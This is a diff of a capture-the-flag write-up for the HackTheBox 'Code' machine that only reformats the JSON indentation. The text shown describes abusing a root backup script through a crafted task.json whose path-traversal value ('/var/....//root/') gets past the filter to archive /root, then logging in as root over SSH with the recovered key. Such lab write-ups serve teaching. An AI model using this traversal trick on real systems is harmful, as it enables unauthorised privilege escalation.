@@ -307,16 +307,16 @@ The below **JSON** file was the one that was available in the martin's home dire
 ```json
 martin@code:~/backups$ cat task.json 
 {
-        "destination": "/home/martin/backups/",
-        "multiprocessing": true,
-        "verbose_log": false,
-        "directories_to_archive": [
-                "/home/app-production/app"
-        ],
+    "destination": "/home/martin/backups/",
+    "multiprocessing": true,
+    "verbose_log": false,
+    "directories_to_archive": [
+        "/home/app-production/app"
+    ],
 
-        "exclude": [
-                ".*"
-        ]
+    "exclude": [
+        ".*"
+    ]
 }
 
 ```
@@ -325,12 +325,12 @@ To "exploit" the above bash script we had to create a new *"malicious*" JSON fil
 
 ```json
 {
-        "destination": "/tmp/",
-        "multiprocessing": true,
-        "verbose_log": true,
-        "directories_to_archive": [
+    "destination": "/tmp/",
+    "multiprocessing": true,
+    "verbose_log": true,
+    "directories_to_archive": [
                 "/var/....//root/"
-        ]
+    ]
 }
 ```
 
@@ -404,7 +404,8 @@ We set the permissions on the `private key` to 600, and afterwards we successful
 ┌─[george@parrot]─[~/htb/lvl1/code]
 └──╼ $ssh -i id_rsa_root root@10.129.238.121                                                                    
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
-[...SNIP...]
+[SNIP]
+
 ```
 
 And with that, we successfully compromised the Code machine, gaining both the user and root flags.
